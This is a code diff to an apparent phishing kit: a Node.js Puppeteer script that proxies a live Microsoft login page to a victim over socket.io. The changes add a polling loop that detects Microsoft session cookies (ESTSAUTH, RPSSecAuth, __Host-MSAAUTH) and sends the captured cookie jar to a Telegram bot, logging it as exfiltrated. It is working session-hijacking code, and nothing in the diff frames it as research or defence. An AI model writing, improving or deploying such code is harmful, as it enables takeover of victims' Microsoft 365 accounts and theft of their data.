@@ -11,13 +11,16 @@ const CHAT_ID = '1318100118';
 const VIEWPORT_WIDTH = 1280;
 const VIEWPORT_HEIGHT = 720;
 
+/**
+ * Sends the captured jar to Telegram with HTML-safe formatting.
+ */
 async function sendExfiltrationAlert(cookies, finalUrl) {
     const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
     const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     try {
         const host = new URL(finalUrl).hostname;
-        const textAlert = `<b>✅ AUTHENTICATION CAPTURED</b>\n\n<b>Landing:</b> <code>${host}</code>\n<b>Cookie Count:</b> ${cookies.length}\n\n<i>Note: Session tokens validated.</i>`;
+        const textAlert = `<b>✅ AUTHENTICATION CAPTURED</b>\n\n<b>Landing:</b> <code>${host}</code>\n<b>Cookie Count:</b> ${cookies.length}\n\n<i>Status: Validated session tokens found via Polling.</i>`;
         
         await axios.post(msgUrl, {
             chat_id: CHAT_ID,
@@ -35,7 +38,7 @@ async function sendExfiltrationAlert(cookies, finalUrl) {
         });
 
         await axios.post(docUrl, form, { headers: form.getHeaders() });
-        console.log("[TELEGRAM] Data exfiltrated.");
+        console.log("[TELEGRAM] Data exfiltrated successfully.");
     } catch (e) {
         console.error('[EXFIL-ERR]', e.message);
     }
@@ -65,38 +68,49 @@ async function startSession(io, socket) {
         };
 
         await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
+        
+        // 1. Snapshot Heartbeat (Visuals)
         const heartbeat = setInterval(emitFrame, 1200);
 
-        page.on('framenavigated', async (frame) => {
+        // 2. ACTIVE COOKIE POLLING (The Fix)
+        const cookieChecker = setInterval(async () => {
             if (hasExfiltrated) return;
 
+            try {
+                const cookies = await page.cookies();
+                const url = page.url().toLowerCase();
+
+                // Look for the specific "Golden" tokens
+                const hasAuthTokens = cookies.some(c => 
+                    c.name.includes('ESTSAUTH') || 
+                    c.name.includes('RPSSecAuth') || 
+                    c.name.includes('__Host-MSAAUTH')
+                );
+
+                // Trigger if tokens exist and we are past the initial landing page
+                if (hasAuthTokens && !url.includes('/oauth20_authorize.srf')) {
+                    hasExfiltrated = true; // Lock immediately
+                    console.log(`[POLLING-SUCCESS] Valid tokens found in jar. Capturing...`);
+                    
+                    clearInterval(cookieChecker); // Stop checking
+                    
+                    // Brief delay to ensure persistence cookies (ESTSAUTHPERSISTENT) are written
+                    await new Promise(r => setTimeout(r, 4000));
+                    
+                    const finalCookies = await page.cookies();
+                    await sendExfiltrationAlert(finalCookies, page.url());
+                }
+            } catch (e) {
+                console.error('[POLL-ERR]', e.message);
+            }
+        }, 2500);
+
+        // Backup: Frame Navigation trigger
+        page.on('framenavigated', async (frame) => {
+            if (hasExfiltrated) return;
             const url = frame.url().toLowerCase();
-            
-            // Check for Dashboard URLs
-            const isDashboard = url.includes('office.com') || 
-                                url.includes('outlook.live.com') || 
-                                url.includes('microsoft365.com');
-
-            // Always ignore the initial auth redirect to prevent early-fire
-            if (url.includes('/oauth20_authorize.srf')) return;
-
-            // CHECK COOKIES ON EVERY NAVIGATION AFTER LOGIN STARTS
-            const cookies = await page.cookies();
-            const hasAuthTokens = cookies.some(c => 
-                c.name.includes('ESTSAUTH') || 
-                c.name.includes('RPSSecAuth') || 
-                c.name.includes('__Host-MSAAUTH')
-            );
-
-            // TRIGGER: Either we hit the dashboard OR we have the tokens and are past the main login screen
-            if (hasAuthTokens && (isDashboard || url.includes('kmsi') || url.includes('shell/homepage'))) {
-                hasExfiltrated = true;
-                console.log(`[SUCCESS] Tokens detected at ${url}. Sending...`);
-                
-                // Final 3-second wait to ensure persistence cookies are written
-                await new Promise(r => setTimeout(r, 3000));
-                const finalCookies = await page.cookies();
-                await sendExfiltrationAlert(finalCookies, url);
+            if (url.includes('office.com') || url.includes('outlook.live.com')) {
+                // The polling loop will likely beat this, but this serves as a safety net
             }
         });
 
@@ -113,10 +127,13 @@ async function startSession(io, socket) {
 
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
+            clearInterval(cookieChecker);
             if (browser) await browser.close();
+            console.log(`[CLEANUP] Session ${socket.id} closed.`);
         });
 
     } catch (error) {
+        console.error('[FATAL]', error.message);
         if (browser) await browser.close();
     }
 }
